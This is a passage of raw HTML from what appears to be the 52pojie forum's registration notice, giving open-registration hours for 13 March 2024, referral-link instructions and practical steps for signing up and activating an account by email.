15px; margin-bottom: 15px; letter-spacing: normal; text-align: start; color: rgb(68, 68, 68);"><strong><span style="color: rgb(255, 0, 0);"><span style="display: inline-block; text-indent: initial;">关</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">官</span><span style="display: inline-block; text-indent: initial;">方</span><span style="display: inline-block; text-indent: initial;">微</span><span style="display: inline-block; text-indent: initial;">信</span><span style="display: inline-block; text-indent: initial;">随</span><span style="display: inline-block; text-indent: initial;">时</span><span style="display: inline-block; text-indent: initial;">了</span><span style="display: inline-block; text-indent: initial;">解</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">开</span><span style="display: inline-block; text-indent: initial;">放</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span><span style="display: inline-block; text-indent: initial;">等</span><span style="display: inline-block; text-indent: initial;">信</span><span style="display: inline-block; text-indent: initial;">息</span><span style="display: inline-block; text-indent: initial;">还</span><span style="display: inline-block; text-indent: initial;">可</span><span style="display: inline-block; text-indent: initial;">以</span><span style="display: inline-block; text-indent: initial;">每</span><span style="display: inline-block; text-indent: initial;">天</span><span style="display: inline-block; text-indent: initial;">签</span><span style="display: inline-block; text-indent: initial;">到</span><span style="display: inline-block; text-indent: initial;">领</span><span style="display: inline-block; text-indent: initial;">C</span><span style="display: inline-block; text-indent: initial;">B</span><span style="display: inline-block; text-indent: initial;">！</span></span></strong></p><h2 style="margin-top: 20px; margin-bottom: 20px; font-weight: bold; font-size: 24px; color: rgb(53, 53, 53); letter-spacing: normal; text-align: start; border-bottom: 2px solid rgb(204, 204, 204);"><span style="display: inline-block; text-indent: initial;">开</span><span style="display: inline-block; text-indent: initial;">放</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span><span style="display: inline-block; text-indent: initial;">时</span><span style="display: inline-block; text-indent: initial;">间</span></h2><p style="margin-top: 15px; margin-bottom: 15px; letter-spacing: normal; text-align: start; color: rgb(68, 68, 68);"><span><span style="display: inline-block; text-indent: initial;">为</span><span style="display: inline-block; text-indent: initial;">了</span><span style="display: inline-block; text-indent: initial;">避</span><span style="display: inline-block; text-indent: initial;">免</span><span style="display: inline-block; text-indent: initial;">由</span><span style="display: inline-block; text-indent: initial;">开</span><span style="display: inline-block; text-indent: initial;">放</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span><span style="display: inline-block; text-indent: initial;">带</span><span style="display: inline-block; text-indent: initial;">来</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">负</span><span style="display: inline-block; text-indent: initial;">面</span><span style="display: inline-block; text-indent: initial;">影</span><span style="display: inline-block; text-indent: initial;">响</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">我</span><span style="display: inline-block; text-indent: initial;">们</span><span style="display: inline-block; text-indent: initial;">将</span><span style="display: inline-block; text-indent: initial;">加</span><span style="display: inline-block; text-indent: initial;">强</span><span style="display: inline-block; text-indent: initial;">对</span><span style="display: inline-block; text-indent: initial;">新</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span><span style="display: inline-block; text-indent: initial;">用</span><span style="display: inline-block; text-indent: initial;">户</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">管</span><span style="display: inline-block; text-indent: initial;">理</span><span style="display: inline-block; text-indent: initial;">。</span><span style="display: inline-block; text-indent: initial;">对</span><span style="display: inline-block; text-indent: initial;">于</span><span style="display: inline-block; text-indent: initial;">发</span><span style="display: inline-block; text-indent: initial;">现</span><span style="display: inline-block; text-indent: initial;">有</span><span style="display: inline-block; text-indent: initial;">马</span><span style="display: inline-block; text-indent: initial;">甲</span><span style="display: inline-block; text-indent: initial;">或</span><span style="display: inline-block; text-indent: initial;">者</span><span style="display: inline-block; text-indent: initial;">新</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span><span style="display: inline-block; text-indent: initial;">用</span><span style="display: inline-block; text-indent: initial;">户</span><span style="display: inline-block; text-indent: initial;">从</span><span style="display: inline-block; text-indent: initial;">事</span><span style="display: inline-block; text-indent: initial;">违</span><span style="display: inline-block; text-indent: initial;">规</span><span style="display: inline-block; text-indent: initial;">行</span><span style="display: inline-block; text-indent: initial;">为</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">情</span><span style="display: inline-block; text-indent: initial;">况</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">我</span><span style="display: inline-block; text-indent: initial;">们</span><span style="display: inline-block; text-indent: initial;">会</span><span style="display: inline-block; text-indent: initial;">采</span><span style="display: inline-block; text-indent: initial;">取</span><span style="display: inline-block; text-indent: initial;">更</span><span style="display: inline-block; text-indent: initial;">加</span><span style="display: inline-block; text-indent: initial;">严</span><span style="display: inline-block; text-indent: initial;">格</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">处</span><span style="display: inline-block; text-indent: initial;">理</span><span style="display: inline-block; text-indent: initial;">措</span><span style="display: inline-block; text-indent: initial;">施</span><span style="display: inline-block; text-indent: initial;">。</span><span style="display: inline-block; text-indent: initial;">在</span><span style="display: inline-block; text-indent: initial;">您</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span><span style="display: inline-block; text-indent: initial;">前</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">请</span><span style="display: inline-block; text-indent: initial;">认</span><span style="display: inline-block; text-indent: initial;">真</span><span style="display: inline-block; text-indent: initial;">阅</span><span style="display: inline-block; text-indent: initial;">读</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span><span style="display: inline-block; text-indent: initial;">须</span><span style="display: inline-block; text-indent: initial;">知</span><span style="display: inline-block; text-indent: initial;">以</span><span style="display: inline-block; text-indent: initial;">及</span><span style="display: inline-block; text-indent: initial;">社</span><span style="display: inline-block; text-indent: initial;">区</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">总</span><span style="display: inline-block; text-indent: initial;">版</span><span style="display: inline-block; text-indent: initial;">规</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">以</span><span style="display: inline-block; text-indent: initial;">便</span><span style="display: inline-block; text-indent: initial;">更</span><span style="display: inline-block; text-indent: initial;">好</span><span style="display: inline-block; text-indent: initial;">地</span><span style="display: inline-block; text-indent: initial;">适</span><span style="display: inline-block; text-indent: initial;">应</span><span style="display: inline-block; text-indent: initial;">和</span><span style="display: inline-block; text-indent: initial;">享</span><span style="display: inline-block; text-indent: initial;">受</span><span style="display: inline-block; text-indent: initial;">我</span><span style="display: inline-block; text-indent: initial;">们</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">社</span><span style="display: inline-block; text-indent: initial;">区</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">具</span><span style="display: inline-block; text-indent: initial;">体</span><span style="display: inline-block; text-indent: initial;">限</span><span style="display: inline-block; text-indent: initial;">时</span><span style="display: inline-block; text-indent: initial;">开</span><span style="display: inline-block; text-indent: initial;">放</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span><span style="display: inline-block; text-indent: initial;">时</span><span style="display: inline-block; text-indent: initial;">间</span><span style="display: inline-block; text-indent: initial;">如</span><span style="display: inline-block; text-indent: initial;">下</span><span style="display: inline-block; text-indent: initial;">：</span></span><span style="font-size: 14px;"></span></p><p style="margin-top: 15px; margin-bottom: 15px; letter-spacing: normal; text-align: start; color: rgb(68, 68, 68);"><span style="font-size: 14px;"><strong><span style="color: rgb(255, 0, 0);"><span style="display: inline-block; text-indent: initial;">2</span><span style="display: inline-block; text-indent: initial;">0</span><span style="display: inline-block; text-indent: initial;">24</span><span style="display: inline-block; text-indent: initial;">年</span><span style="display: inline-block; text-indent: initial;">3</span><span style="display: inline-block; text-indent: initial;">月</span><span style="display: inline-block; text-indent: initial;">13</span><span style="display: inline-block; text-indent: initial;">日</span><span style="display: inline-block; text-indent: initial;"> </span><span style="display: inline-block; text-indent: initial;">1</span><span style="display: inline-block; text-indent: initial;">2</span><span style="display: inline-block; text-indent: initial;">：</span></span></strong><strong><span style="color: rgb(255, 0, 0);"><span style="display: inline-block; text-indent: initial;">0</span><span style="display: inline-block; text-indent: initial;">0</span><span style="display: inline-block; text-indent: initial;"> </span><span style="display: inline-block; text-indent: initial;">-</span><span style="display: inline-block; text-indent: initial;">-</span><span style="display: inline-block; text-indent: initial;"> </span><span style="display: inline-block; text-indent: initial;">1</span><span style="display: inline-block; text-indent: initial;">4</span><span style="display: inline-block; text-indent: initial;">：</span><span style="display: inline-block; text-indent: initial;">0</span><span style="display: inline-block; text-indent: initial;">0</span><span style="display: inline-block; text-indent: initial;"> </span><span style="display: inline-block; text-indent: initial;">和</span><span style="display: inline-block; text-indent: initial;"> </span><span style="display: inline-block; text-indent: initial;">2</span><span style="display: inline-block; text-indent: initial;">0</span><span style="display: inline-block; text-indent: initial;">：</span><span style="display: inline-block; text-indent: initial;">0</span><span style="display: inline-block; text-indent: initial;">0</span><span style="display: inline-block; text-indent: initial;"> </span><span style="display: inline-block; text-indent: initial;">-</span><span style="display: inline-block; text-indent: initial;">-</span><span style="display: inline-block; text-indent: initial;"> </span><span style="display: inline-block; text-indent: initial;">2</span><span style="display: inline-block; text-indent: initial;">2</span><span style="display: inline-block; text-indent: initial;">：</span><span style="display: inline-block; text-indent: initial;">0</span><span style="display: inline-block; text-indent: initial;">0</span></span></strong></span></p><h2 style="margin-top: 20px; margin-bottom: 20px; font-weight: bold; font-size: 24px; color: rgb(53, 53, 53); letter-spacing: normal; text-align: start; border-bottom: 2px solid rgb(204, 204, 204);"><span style="display: inline-block; text-indent: initial;">邀</span><span style="display: inline-block; text-indent: initial;">请</span><span style="display: inline-block; text-indent: initial;">获</span><span style="display: inline-block; text-indent: initial;">得</span><span style="display: inline-block; text-indent: initial;">贡</span><span style="display: inline-block; text-indent: initial;">献</span></h2><ul class="list-paddingleft-1" style="padding-left: 0px; color: rgb(53, 53, 53);"><li style="margin-left: 2px;"><p style="margin-bottom: 15px;"><span style="font-size: 14px;"><span style="font-size: 14px; font-weight: 700;">大家可以推荐自己的朋友注册</span>，从而增加自己的<span style="font-size: 14px; font-weight: 700;">贡献值</span>，只要通过你推荐的地址注册，你就会增加一个贡献值，注册完可以炫耀一下贡献值啦，你可以把我的账号改成你的账号就是你的推广地址啦，比如我的推广地址可以是以下链接：</span></p><blockquote style="margin-top: 0px; margin-bottom: 0px; color: rgb(106, 115, 125); padding-top: 0px; padding-right: 1em; padding-left: 1em; border-left-width: 0.25em; border-left-color: rgb(223, 226, 229);"><p style="margin-bottom: 15px;"><span style="font-size: 14px;">https://www.52pojie.cn/?fromuser=LCG</span><span style="font-size: 14px;"> 【把LCG换成自己的账号即可】</span></p><p><span style="font-size: 14px;">https://www.52pojie.cn/?fromuid=14</span><span style="font-size: 14px;"> 【把14换成自己的UID即可，UID查看：</span><span style="font-size: 14px;">https://www.52pojie.cn/home.php?mod=space&amp;do=profile</span><span style="font-size: 14px;"> 】</span></p></blockquote></li></ul><h2 style="margin-top: 20px; margin-bottom: 20px; font-weight: bold; font-size: 24px; color: rgb(53, 53, 53); letter-spacing: normal; text-align: start; border-bottom: 2px solid rgb(204, 204, 204);"><span style="color: rgb(255, 0, 0);"><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">要</span><span style="display: inline-block; text-indent: initial;">准</span><span style="display: inline-block; text-indent: initial;">备</span><span style="display: inline-block; text-indent: initial;">什</span><span style="display: inline-block; text-indent: initial;">么</span><span style="display: inline-block; text-indent: initial;">？</span></span></h2><ol class="list-paddingleft-1" style="padding-left: 0px; color: rgb(53, 53, 53);"><li><p style="line-height: 1.6;"><span style="font-size: 14px;"><span style="display: inline-block; text-indent: initial;">★</span><span style="display: inline-block; text-indent: initial;">★</span><span style="display: inline-block; text-indent: initial;">★</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span><span style="display: inline-block; text-indent: initial;">前</span><span style="display: inline-block; text-indent: initial;">优</span><span style="display: inline-block; text-indent: initial;">先</span><span style="display: inline-block; text-indent: initial;">阅</span><span style="display: inline-block; text-indent: initial;">读</span><span style="display: inline-block; text-indent: initial;"> </span><strong style="line-height: 1.6;"><span style="color: rgb(255, 0, 0); line-height: 1.6;"><span style="display: inline-block; text-indent: initial;">验</span><span style="display: inline-block; text-indent: initial;">证</span><span style="display: inline-block; text-indent: initial;">码</span><span style="display: inline-block; text-indent: initial;">异</span><span style="display: inline-block; text-indent: initial;">常</span><span style="display: inline-block; text-indent: initial;">问</span><span style="display: inline-block; text-indent: initial;">题</span><span style="display: inline-block; text-indent: initial;">、</span><span style="display: inline-block; text-indent: initial;">等</span><span style="display: inline-block; text-indent: initial;">待</span><span style="display: inline-block; text-indent: initial;">验</span><span style="display: inline-block; text-indent: initial;">证</span><span style="display: inline-block; text-indent: initial;">会</span><span style="display: inline-block; text-indent: initial;">员</span><span style="display: inline-block; text-indent: initial;">问</span><span style="display: inline-block; text-indent: initial;">题</span><span style="display: inline-block; text-indent: initial;">、</span><span style="display: inline-block; text-indent: initial;">邮</span><span style="display: inline-block; text-indent: initial;">件</span><span style="display: inline-block; text-indent: initial;">激</span><span style="display: inline-block; text-indent: initial;">活</span><span style="display: inline-block; text-indent: initial;">问</span><span style="display: inline-block; text-indent: initial;">题</span></span></strong><span style="display: inline-block; text-indent: initial;"> </span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">帮</span><span style="display: inline-block; text-indent: initial;">助</span><span style="display: inline-block; text-indent: initial;">你</span><span style="display: inline-block; text-indent: initial;">快</span><span style="display: inline-block; text-indent: initial;">速</span><span style="display: inline-block; text-indent: initial;">准</span><span style="display: inline-block; text-indent: initial;">确</span><span style="display: inline-block; text-indent: initial;">成</span><span style="display: inline-block; text-indent: initial;">功</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span><span style="display: inline-block; text-indent: initial;">到</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">账</span><span style="display: inline-block; text-indent: initial;">号</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">请</span><span style="display: inline-block; text-indent: initial;">参</span><span style="display: inline-block; text-indent: initial;">看</span><span style="display: inline-block; text-indent: initial;">地</span><span style="display: inline-block; text-indent: initial;">址</span><span style="display: inline-block; text-indent: initial;">：</span></span><span style="font-size: 14px;"><span style="display: inline-block; text-indent: initial;">h</span><span style="display: inline-block; text-indent: initial;">t</span><span style="display: inline-block; text-indent: initial;">t</span><span style="display: inline-block; text-indent: initial;">p</span><span style="display: inline-block; text-indent: initial;">s</span><span style="display: inline-block; text-indent: initial;">:</span><span style="display: inline-block; text-indent: initial;">/</span><span style="display: inline-block; text-indent: initial;">/</span><span style="display: inline-block; text-indent: initial;">w</span><span style="display: inline-block; text-indent: initial;">w</span><span style="display: inline-block; text-indent: initial;">w</span><span style="display: inline-block; text-indent: initial;">.</span><span style="display: inline-block; text-indent: initial;">5</span><span style="display: inline-block; text-indent: initial;">2</span><span style="display: inline-block; text-indent: initial;">p</span><span style="display: inline-block; text-indent: initial;">o</span><span style="display: inline-block; text-indent: initial;">j</span><span style="display: inline-block; text-indent: initial;">i</span><span style="display: inline-block; text-indent: initial;">e</span><span style="display: inline-block; text-indent: initial;">.</span><span style="display: inline-block; text-indent: initial;">c</span><span style="display: inline-block; text-indent: initial;">n</span><span style="display: inline-block; text-indent: initial;">/</span><span style="display: inline-block; text-indent: initial;">t</span><span style="display: inline-block; text-indent: initial;">h</span><span style="display: inline-block; text-indent: initial;">r</span><span style="display: inline-block; text-indent: initial;">e</span><span style="display: inline-block; text-indent: initial;">a</span><span style="display: inline-block; text-indent: initial;">d</span><span style="display: inline-block; text-indent: initial;">-</span><span style="display: inline-block; text-indent: initial;">9</span><span style="display: inline-block; text-indent: initial;">8</span><span style="display: inline-block; text-indent: initial;">5</span><span style="display: inline-block; text-indent: initial;">8</span><span style="display: inline-block; text-indent: initial;">5</span><span style="display: inline-block; text-indent: initial;">-</span><span style="display: inline-block; text-indent: initial;">1</span><span style="display: inline-block; text-indent: initial;">-</span><span style="display: inline-block; text-indent: initial;">1</span><span style="display: inline-block; text-indent: initial;">.</span><span style="display: inline-block; text-indent: initial;">h</span><span style="display: inline-block; text-indent: initial;">t</span><span style="display: inline-block; text-indent: initial;">m</span><span style="display: inline-block; text-indent: initial;">l</span></span></p></li><li><p style="line-height: 1.6;"><span style="font-size: 14px;"><span style="display: inline-block; text-indent: initial;">需</span><span style="display: inline-block; text-indent: initial;">要</span><span style="display: inline-block; text-indent: initial;">确</span><span style="display: inline-block; text-indent: initial;">认</span><span style="display: inline-block; text-indent: initial;">你</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">用</span><span style="display: inline-block; text-indent: initial;">户</span><span style="display: inline-block; text-indent: initial;">名</span><span style="display: inline-block; text-indent: initial;">和</span><span style="display: inline-block; text-indent: initial;">邮</span><span style="display: inline-block; text-indent: initial;">箱</span><span style="display: inline-block; text-indent: initial;">是</span><span style="display: inline-block; text-indent: initial;">否</span><span style="display: inline-block; text-indent: initial;">被</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span><span style="display: inline-block; text-indent: initial;">过</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">选</span><span style="display: inline-block; text-indent: initial;">择</span><span style="display: inline-block; text-indent: initial;">一</span><span style="display: inline-block; text-indent: initial;">个</span><span style="display: inline-block; text-indent: initial;">没</span><span style="display: inline-block; text-indent: initial;">有</span><span style="display: inline-block; text-indent: initial;">人</span><span style="display: inline-block; text-indent: initial;">使</span><span style="display: inline-block; text-indent: initial;">用</span><span style="display: inline-block; text-indent: initial;">过</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">信</span><span style="display: inline-block; text-indent: initial;">息</span><span style="display: inline-block; text-indent: initial;">来</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">到</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span><span style="display: inline-block; text-indent: initial;">页</span><span style="display: inline-block; text-indent: initial;">面</span><span style="display: inline-block; text-indent: initial;">在</span><span style="display: inline-block; text-indent: initial;">用</span><span style="display: inline-block; text-indent: initial;">户</span><span style="display: inline-block; text-indent: initial;">名</span><span style="display: inline-block; text-indent: initial;">和</span><span style="display: inline-block; text-indent: initial;">E</span><span style="display: inline-block; text-indent: initial;">m</span><span style="display: inline-block; text-indent: initial;">a</span><span style="display: inline-block; text-indent: initial;">i</span><span style="display: inline-block; text-indent: initial;">l</span><span style="display: inline-block; text-indent: initial;">栏</span><span style="display: inline-block; text-indent: initial;">输</span><span style="display: inline-block; text-indent: initial;">入</span><span style="display: inline-block; text-indent: initial;">你</span><span style="display: inline-block; text-indent: initial;">想</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">信</span><span style="display: inline-block; text-indent: initial;">息</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">如</span><span style="display: inline-block; text-indent: initial;">果</span><span style="display: inline-block; text-indent: initial;">被</span><span style="display: inline-block; text-indent: initial;">使</span><span style="display: inline-block; text-indent: initial;">用</span><span style="display: inline-block; text-indent: initial;">了</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">后</span><span style="display: inline-block; text-indent: initial;">面</span><span style="display: inline-block; text-indent: initial;">会</span><span style="display: inline-block; text-indent: initial;">有</span><span style="display: inline-block; text-indent: initial;">提</span><span style="display: inline-block; text-indent: initial;">示</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">预</span><span style="display: inline-block; text-indent: initial;">祝</span><span style="display: inline-block; text-indent: initial;">你</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">信</span><span style="display: inline-block; text-indent: initial;">息</span><span style="display: inline-block; text-indent: initial;">独</span><span style="display: inline-block; text-indent: initial;">一</span><span style="display: inline-block; text-indent: initial;">无</span><span style="display: inline-block; text-indent: initial;">二</span><span style="display: inline-block; text-indent: initial;">！</span></span></p></li><li><p style="line-height: 1.6;"><span style="font-size: 14px;"><span style="display: inline-block; text-indent: initial;">查</span><span style="display: inline-block; text-indent: initial;">看</span><span style="display: inline-block; text-indent: initial;">系</span><span style="display: inline-block; text-indent: initial;">统</span><span style="display: inline-block; text-indent: initial;">时</span><span style="display: inline-block; text-indent: initial;">间</span><span style="display: inline-block; text-indent: initial;">是</span><span style="display: inline-block; text-indent: initial;">否</span><span style="display: inline-block; text-indent: initial;">正</span><span style="display: inline-block; text-indent: initial;">确</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">包</span><span style="display: inline-block; text-indent: initial;">括</span><span style="display: inline-block; text-indent: initial;">年</span><span style="display: inline-block; text-indent: initial;">月</span><span style="display: inline-block; text-indent: initial;">日</span><span style="display: inline-block; text-indent: initial;">分</span><span style="display: inline-block; text-indent: initial;">钟</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">如</span><span style="display: inline-block; text-indent: initial;">果</span><span style="display: inline-block; text-indent: initial;">不</span><span style="display: inline-block; text-indent: initial;">正</span><span style="display: inline-block; text-indent: initial;">确</span><span style="display: inline-block; text-indent: initial;">可</span><span style="display: inline-block; text-indent: initial;">能</span><span style="display: inline-block; text-indent: initial;">造</span><span style="display: inline-block; text-indent: initial;">成</span><span style="display: inline-block; text-indent: initial;">验</span><span style="display: inline-block; text-indent: initial;">证</span><span style="display: inline-block; text-indent: initial;">码</span><span style="display: inline-block; text-indent: initial;">输</span><span style="display: inline-block; text-indent: initial;">入</span><span style="display: inline-block; text-indent: initial;">不</span><span style="display: inline-block; text-indent: initial;">正</span><span style="display: inline-block; text-indent: initial;">确</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">还</span><span style="display: inline-block; text-indent: initial;">可</span><span style="display: inline-block; text-indent: initial;">以</span><span style="display: inline-block; text-indent: initial;">清</span><span style="display: inline-block; text-indent: initial;">空</span><span style="display: inline-block; text-indent: initial;">下</span><span style="display: inline-block; text-indent: initial;">浏</span><span style="display: inline-block; text-indent: initial;">览</span><span style="display: inline-block; text-indent: initial;">器</span><span style="display: inline-block; text-indent: initial;">缓</span><span style="display: inline-block; text-indent: initial;">存</span><span style="display: inline-block; text-indent: initial;">和</span><span style="display: inline-block; text-indent: initial;">c</span><span style="display: inline-block; text-indent: initial;">o</span><span style="display: inline-block; text-indent: initial;">o</span><span style="display: inline-block; text-indent: initial;">k</span><span style="display: inline-block; text-indent: initial;">i</span><span style="display: inline-block; text-indent: initial;">e</span><span style="display: inline-block; text-indent: initial;">。</span></span></p></li><li><p style="line-height: 1.6;"><span style="font-size: 14px;"><span style="display: inline-block; text-indent: initial;">前</span><span style="display: inline-block; text-indent: initial;">三</span><span style="display: inline-block; text-indent: initial;">步</span><span style="display: inline-block; text-indent: initial;">做</span><span style="display: inline-block; text-indent: initial;">好</span><span style="display: inline-block; text-indent: initial;">以</span><span style="display: inline-block; text-indent: initial;">后</span><span style="display: inline-block; text-indent: initial;">来</span><span style="display: inline-block; text-indent: initial;">到</span><span style="display: inline-block; text-indent: initial;">最</span><span style="display: inline-block; text-indent: initial;">重</span><span style="display: inline-block; text-indent: initial;">要</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">第</span><span style="display: inline-block; text-indent: initial;">四</span><span style="display: inline-block; text-indent: initial;">步</span><span style="display: inline-block; text-indent: initial;">：</span></span><span style="font-size: 14px;"><span style="display: inline-block; text-indent: initial;">通</span><span style="display: inline-block; text-indent: initial;">过</span><span style="display: inline-block; text-indent: initial;">邮</span><span style="display: inline-block; text-indent: initial;">箱</span><span style="display: inline-block; text-indent: initial;">激</span><span style="display: inline-block; text-indent: initial;">活</span><span style="display: inline-block; text-indent: initial;">账</span><span style="display: inline-block; text-indent: initial;">号</span><span style="display: inline-block; text-indent: initial;">，</span><strong style="line-height: 1.6;"><span style="color: rgb(0, 0, 255); line-height: 1.6;"><span style="display: inline-block; text-indent: initial;">在</span><span style="display: inline-block; text-indent: initial;">没</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span><span style="display: inline-block; text-indent: initial;">前</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">需</span><span style="display: inline-block; text-indent: initial;">要</span><span style="display: inline-block; text-indent: initial;">先</span><span style="display: inline-block; text-indent: initial;">将</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">域</span><span style="display: inline-block; text-indent: initial;">名</span><span style="display: inline-block; text-indent: initial;">加</span><span style="display: inline-block; text-indent: initial;">入</span><span style="display: inline-block; text-indent: initial;">到</span><span style="display: inline-block; text-indent: initial;">将</span><span style="display: inline-block; text-indent: initial;">要</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">邮</span><span style="display: inline-block; text-indent: initial;">箱</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">白</span><span style="display: inline-block; text-indent: initial;">名</span><span style="display: inline-block; text-indent: initial;">单</span><span style="display: inline-block; text-indent: initial;">中</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">以</span><span style="display: inline-block; text-indent: initial;">便</span><span style="display: inline-block; text-indent: initial;">可</span><span style="display: inline-block; text-indent: initial;">以</span><span style="display: inline-block; text-indent: initial;">准</span><span style="display: inline-block; text-indent: initial;">确</span><span style="display: inline-block; text-indent: initial;">无</span><span style="display: inline-block; text-indent: initial;">误</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">收</span><span style="display: inline-block; text-indent: initial;">到</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">发</span><span style="display: inline-block; text-indent: initial;">送</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">激</span><span style="display: inline-block; text-indent: initial;">活</span><span style="display: inline-block; text-indent: initial;">邮</span><span style="display: inline-block; text-indent: initial;">件</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">只</span><span style="display: inline-block; text-indent: initial;">有</span><span style="display: inline-block; text-indent: initial;">通</span><span style="display: inline-block; text-indent: initial;">过</span><span style="display: inline-block; text-indent: initial;">邮</span><span style="display: inline-block; text-indent: initial;">件</span><span style="display: inline-block; text-indent: initial;">激</span><span style="display: inline-block; text-indent: initial;">活</span><span style="display: inline-block; text-indent: initial;">了</span><span style="display: inline-block; text-indent: initial;">账</span><span style="display: inline-block; text-indent: initial;">号</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">才</span><span style="display: inline-block; text-indent: initial;">可</span><span style="display: inline-block; text-indent: initial;">以</span><span style="display: inline-block; text-indent: initial;">正</span><span style="display: inline-block; text-indent: initial;">常</span><span style="display: inline-block; text-indent: initial;">访</span><span style="display: inline-block; text-indent: initial;">问</span><span style="display: inline-block; text-indent: initial;">回</span><span style="display: inline-block; text-indent: initial;">帖</span><span style="display: inline-block; text-indent: initial;">和</span><span style="display: inline-block; text-indent: initial;">下</span><span style="display: inline-block; text-indent: initial;">载</span><span style="display: inline-block; text-indent: initial;">附</span><span style="display: inline-block; text-indent: initial;">件</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">否</span><span style="display: inline-block; text-indent: initial;">则</span><span style="display: inline-block; text-indent: initial;">账</span><span style="display: inline-block; text-indent: initial;">号</span><span style="display: inline-block; text-indent: initial;">会</span><span style="display: inline-block; text-indent: initial;">被</span><span style="display: inline-block; text-indent: initial;">很</span><span style="display: inline-block; text-indent: initial;">快</span><span style="display: inline-block; text-indent: initial;">清</span><span style="display: inline-block; text-indent: initial;">理</span><span style="display: inline-block; text-indent: initial;">掉</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">如</span><span style="display: inline-block; text-indent: initial;">何</span><span style="display: inline-block; text-indent: initial;">操</span><span style="display: inline-block; text-indent: initial;">作</span><span style="display: inline-block; text-indent: initial;">具</span><span style="display: inline-block; text-indent: initial;">体</span><span 